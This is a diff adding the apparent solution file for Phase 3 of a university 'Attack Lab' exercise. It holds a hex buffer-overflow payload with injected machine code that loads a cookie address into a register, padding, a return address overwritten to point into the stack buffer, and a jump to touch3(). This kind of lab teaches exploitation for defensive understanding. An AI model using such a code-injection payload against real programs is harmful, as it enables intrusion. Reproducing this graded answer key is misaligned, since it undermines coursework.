@@ -1,0 +1,13 @@
+Attack Lab Phase 3
+
+Buffer input:
+
+48 c7 c7 50 17 68 55 c3 /* mov location of cookie to rdi and retq */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00  /* end of buf */
+18 17 68 55 00 00 00 00  /* ret address to buf */
+3c 18 40 00 00 00 00 00  /* ret address to touch3() */
+/* cookie */
+35 61 34 66 37 39 36 62 00 
